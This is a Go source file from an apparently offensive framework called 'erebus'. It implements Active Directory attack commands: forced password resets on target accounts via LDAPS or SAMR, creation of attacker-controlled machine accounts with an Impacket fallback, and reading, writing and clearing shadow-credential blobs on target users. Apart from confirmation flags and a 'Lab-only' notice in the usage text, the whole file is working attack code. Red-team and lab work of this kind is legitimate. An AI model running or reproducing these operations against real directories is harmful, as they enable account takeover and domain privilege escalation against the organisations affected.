package preimplant

import (
	"fmt"
	"os"

	"github.com/KKingZero/erebus-exploit-framwork/pkg/ldapcli"
)

// RunAD dispatches host-side AD set ops (no implant).
func RunAD(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("%s", adUsage)
	}
	switch args[0] {
	case "help", "-h", "--help":
		fmt.Print(adUsage)
		return nil
	case "password", "passwd", "reset":
		return adPassword(args[1:])
	case "add-computer", "addcomputer", "computer":
		return adAddComputer(args[1:])
	case "shadow":
		return adShadow(args[1:])
	default:
		return fmt.Errorf("unknown ad command %q\n%s", args[0], adUsage)
	}
}

const adUsage = `erebus ad — operator-host AD writes (no implant)

  erebus ad password --dc H --domain D --user U --pass-file P \
      --target jake.h --new-pass-file new.txt --yes [--force]
  erebus ad add-computer --dc H --domain D --user U --pass-file P \
      --name ATTACK --computer-pass-file ./mach.pass --out ./mach.pass --yes
      # LDAP Add first; WILL_NOT_PERFORM → Impacket addcomputer.py -method SAMR (temporary)
  erebus ad shadow show  --dc H --domain D --user U --pass-file P --target SAM
  erebus ad shadow write --dc H --domain D --user U --pass-file P --target SAM --key-file blob --yes
  erebus ad shadow clear --dc H --domain D --user U --pass-file P --target SAM --yes

ForceChangePassword / reset via LDAPS unicodePwd replace (no old password).
Requires --yes. Refuses sAM-prefix passwords unless --force.
LDAPS unicodePwd first; if that fails, SAMR via samba net rpc password
(bind secret in PASSWD_FILE, not argv).
Lab-only. High impact — confirm target. See docs/OPERATOR_PRE_IMPLANT.md
`

func adPassword(args []string) error {
	f, _ := ParseFlags(args)
	opts, err := ldapOpts(f)
	if err != nil {
		return err
	}
	target := first(f, "target", "sam")
	newPass, err := readSecret(f, "new-pass", "new-pass-file")
	if err != nil {
		return err
	}
	if target == "" || newPass == "" {
		return fmt.Errorf("--target and --new-pass-file required")
	}
	if !flagBool(f, "yes") {
		return fmt.Errorf("refusing to reset password for %q without --yes", target)
	}
	force := flagBool(f, "force")
	if !force && ldapcli.ContainsSAMPrefix(target, newPass) {
		return fmt.Errorf("new password contains sAM prefix %q; choose another or pass --force", target)
	}
	opts.RequireTLS = true
	printProxyHint()
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return err
	}
	defer conn.Close()
	base := ldapcli.BaseDN(opts.Domain)
	if base == "" {
		return fmt.Errorf("--domain required")
	}
	if err := ldapcli.SetPassword(conn, base, target, newPass, force); err != nil {
		fmt.Printf("LDAP unicodePwd failed: %v\nfalling back to SAMR (net rpc password)\n", err)
		if ferr := samrSetPassword(opts, target, newPass); ferr != nil {
			return fmt.Errorf("ldap: %v; samr: %w", err, ferr)
		}
	}
	fmt.Printf("OK password reset for %s\n", target)
	return nil
}

func adAddComputer(args []string) error {
	f, _ := ParseFlags(args)
	opts, err := ldapOpts(f)
	if err != nil {
		return err
	}
	name := first(f, "name", "computer", "sam")
	if name == "" {
		return fmt.Errorf("--name required")
	}
	if !flagBool(f, "yes") {
		return fmt.Errorf("refusing to create computer %q without --yes", name)
	}
	pass, err := readSecret(f, "computer-pass", "computer-pass-file")
	if err != nil {
		return err
	}
	if pass == "" {
		pass, err = readSecret(f, "new-pass", "new-pass-file")
		if err != nil {
			return err
		}
	}
	opts.RequireTLS = true
	printProxyHint()
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return err
	}
	defer conn.Close()
	base := ldapcli.BaseDN(opts.Domain)
	if base == "" {
		return fmt.Errorf("--domain required")
	}
	if pass == "" {
		pass, err = ldapcli.RandomMachinePassword()
		if err != nil {
			return err
		}
	}
	sam, err := ldapcli.AddComputer(conn, base, name, pass)
	if err != nil {
		if sam == "" && ldapcli.IsWillNotPerform(err) {
			fmt.Printf("LDAP add WILL_NOT_PERFORM; SAMR via addcomputer.py\n")
			if ferr := samrAddComputer(opts, name, pass); ferr != nil {
				return fmt.Errorf("ldap: %v; samr: %w", err, ferr)
			}
			clean, serr := ldapcli.SanitizeComputerName(name)
			if serr != nil {
				return serr
			}
			sam = clean + "$"
		} else {
			return err
		}
	}
	if out := first(f, "out", "pass-out"); out != "" {
		if err := writeSecretFile(out, pass); err != nil {
			return err
		}
		fmt.Printf("OK computer %s  pass-file %s\n", sam, out)
		return nil
	}
	fmt.Printf("OK computer %s\n", sam)
	fmt.Println("machine password written only if --out PATH given (not echoed)")
	return nil
}

func adShadow(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: erebus ad shadow <show|write|clear> ...")
	}
	op := args[0]
	f, _ := ParseFlags(args[1:])
	opts, err := ldapOpts(f)
	if err != nil {
		return err
	}
	target := first(f, "target", "sam", "user")
	if target == "" {
		return fmt.Errorf("--target required")
	}
	opts.RequireTLS = true
	printProxyHint()
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return err
	}
	defer conn.Close()
	base := ldapcli.BaseDN(opts.Domain)
	if base == "" {
		return fmt.Errorf("--domain required")
	}
	switch op {
	case "show", "read":
		st, err := ldapcli.ReadShadow(conn, base, target)
		if err != nil {
			return err
		}
		fmt.Printf("shadow %s blobs=%d (%s)\n", st.TargetSAM, st.Blobs, st.TargetDN)
		return nil
	case "clear", "delete":
		if !flagBool(f, "yes") {
			return fmt.Errorf("refusing shadow clear on %q without --yes", target)
		}
		st, err := ldapcli.ClearShadow(conn, base, target)
		if err != nil {
			return err
		}
		fmt.Printf("OK shadow clear %s blobs=%d\n", st.TargetSAM, st.Blobs)
		return nil
	case "write", "set":
		if !flagBool(f, "yes") {
			return fmt.Errorf("refusing shadow write on %q without --yes", target)
		}
		kf := first(f, "key-file", "blob", "file")
		if kf == "" {
			return fmt.Errorf("--key-file required")
		}
		blob, err := os.ReadFile(kf)
		if err != nil {
			return err
		}
		st, err := ldapcli.WriteShadow(conn, base, target, blob)
		if err != nil {
			return err
		}
		fmt.Printf("OK shadow write %s blobs=%d\n", st.TargetSAM, st.Blobs)
		return nil
	default:
		return fmt.Errorf("usage: erebus ad shadow <show|write|clear>")
	}
}
